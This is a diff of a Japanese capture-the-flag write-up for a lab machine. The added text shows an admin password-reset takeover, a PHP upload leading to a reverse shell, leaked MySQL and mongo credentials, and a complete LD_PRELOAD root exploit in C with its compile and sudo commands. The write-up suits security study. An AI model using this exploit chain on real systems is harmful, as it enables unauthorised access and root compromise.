@@ -154,75 +154,185 @@ DOWNLOADED: 18448 - FOUND: 10
 
 `Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.` から管理者アドレス判明。
 
-パスワードリセット機能で、メールアドレスの部分を管理者アドレスに変更することでパスワード変更できた。
+パスワードリセット機能で、Burpでインターセプトし、メールアドレスの部分を管理者アドレス`admin@sky.thm`に変更することでパスワード変更でき、管理者としてログインできた。
 
-```
-POST /v2/lostpassword.php HTTP/1.1
-Host: road.thm
-Content-Length: 536
-Cache-Control: max-age=0
-Origin: http://road.thm
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1C0Zz0z4ktHj4fxx
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://road.thm/v2/ResetUser.php
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US,en;q=0.9
-Cookie: PHPSESSID=gajdv0qjbp81rnj9f1fjdvuicq; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
-x-forwarded-for: 192.0.0.1
-Connection: keep-alive
+profile.php のHTMLソースに次の記述がある。
 
-------WebKitFormBoundary1C0Zz0z4ktHj4fxx
-Content-Disposition: form-data; name="uname"
-
-admin@sky.thm
-------WebKitFormBoundary1C0Zz0z4ktHj4fxx
-Content-Disposition: form-data; name="npass"
-
-thm
-------WebKitFormBoundary1C0Zz0z4ktHj4fxx
-Content-Disposition: form-data; name="cpass"
-
-thm
-------WebKitFormBoundary1C0Zz0z4ktHj4fxx
-Content-Disposition: form-data; name="ci_csrf_token"
-
-
-------WebKitFormBoundary1C0Zz0z4ktHj4fxx
-Content-Disposition: form-data; name="send"
-
-Submit
-------WebKitFormBoundary1C0Zz0z4ktHj4fxx--
+```html
+<!-- /v2/profileimages/ -->
 ```
 
-続きは後日。
+プロフィール画像アップロード機能で任意のPHPをアップロードでき、上記のディレクトリに保存される。
 
-## 権限昇格
+シェル取得成功。
+
+```sh
+$ nc -lnvp 8888
+listening on [any] 8888 ...
+connect to [10.11.146.32] from (UNKNOWN) [10.201.33.242] 45968
+Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 05:58:36 up 17 min,  0 users,  load average: 0.00, 0.00, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+```
+
+## 権限昇格１
+
+mysqlの接続情報を発見。
+
+```php
+www-data@sky:/var/www/html/v2/admin$ cat reg.php
+<?php
+$username = filter_input(INPUT_POST, 'User_Email');
+$password = filter_input(INPUT_POST, 'User_Pass');
+$contact = filter_input(INPUT_POST, 'Us_Cont');
+if (!empty($username)){
+if (!empty($password)){
+$host = "localhost";
+$dbusername = "root";
+$dbpassword = "ThisIsSecurePassword!";
+$dbname = "SKY";
+// Create connection
+$conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);
+```
+
+mysql に接続したが、既知の情報しか入っていなかった。
+
+```sh
+mysql> select * from Users;
++----+---------------+----------+------------+
+| id | username      | password | phone      |
++----+---------------+----------+------------+
+|  2 | admin@sky.thm | thmthm   | 5486214569 |
+|  7 | thm@sky.thm   | thmthm   | 1234567890 |
++----+---------------+----------+------------+
+```
+
+mongoに接続。mongoコマンドを実行するだけで、接続情報の入力は不要。
+
+```sh
+> show dbs
+admin   0.000GB
+backup  0.000GB
+config  0.000GB
+local   0.000GB
+
+> use backup
+```
+
+webdeveloperのパスワードが入っていた。suコマンドで切り替え可能になった。
+
+```
+> db.user.find().pretty()
+{
+        "_id" : ObjectId("60ae2661203d21857b184a76"),
+        "Month" : "Feb",
+        "Profit" : "25000"
+}
+{
+        "_id" : ObjectId("60ae2677203d21857b184a77"),
+        "Month" : "March",
+        "Profit" : "5000"
+}
+{
+        "_id" : ObjectId("60ae2690203d21857b184a78"),
+        "Name" : "webdeveloper",
+        "Pass" : "[REDACTED]"
+}
+{
+        "_id" : ObjectId("60ae26bf203d21857b184a79"),
+        "Name" : "Rohit",
+        "EndDate" : "December"
+}
+{
+        "_id" : ObjectId("60ae26d2203d21857b184a7a"),
+        "Name" : "Rohit",
+        "Salary" : "30000"
+}
+```
+
+## 権限昇格２
+
+/usr/bin/sky_backup_utility を sudo で実行できる。
+
+```sh
+www-data@sky:/var/www/html/v2/admin$ su webdeveloper
+Password: 
+webdeveloper@sky:/var/www/html/v2/admin$ sudo -l
+Matching Defaults entries for webdeveloper on sky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User webdeveloper may run the following commands on sky:
+    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+```
+
+リバース。tarが絶対パスではないことや、ワイルドカードが使われていることに注意が引かれたが、この場合は悪用できなかった。
+
+- env_reset で PATH がリセットされている。
+- `*` ではなく `/var/www/html/*` という形のワイルドカードであるため、tarのコマンドラインオプションとして偽装することができない。
+
+```c
+bool main(void)
+{
+  int iVar1;
+  
+  puts("Sky Backup Utility");
+  puts("Now attempting to backup Sky");
+  iVar1 = system("tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*");
+  if (iVar1 == 0) {
+    puts("Backup successful!");
+  }
+  else {
+    printf("Backup failed!\nCheck your permissions!");
+  }
+  return iVar1 != 0;
+}
+```
+
+本当の脆弱性は、env_keep+=LD_PRELOAD が指定されている点。  
+
+エクスプロイトコード
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+
+コンパイル
+
+```sh
+webdeveloper@sky:~$ gcc -fPIC -shared -o /tmp/x.so poc.c -nostartfiles
+poc.c: In function ‘hijack’:
+poc.c:8:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    8 |         setgid(0);
+      |         ^~~~~~
+poc.c:9:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    9 |         setuid(0);
+      |
+```
+
+実行
+
+```sh
+webdeveloper@sky:~$ sudo LD_PRELOAD=/tmp/x.so /usr/bin/sky_backup_utility
+root@sky:/home/webdeveloper# id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
 ## 振り返り
 
--
--
-
-## シェル安定化メモ
-
-```shell
-# python が無くても、python3 でいける場合もある
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-
-```
+- ファイルアップロードのディレクトリを発見するのが難しかった
+- mongo は良い経験になった
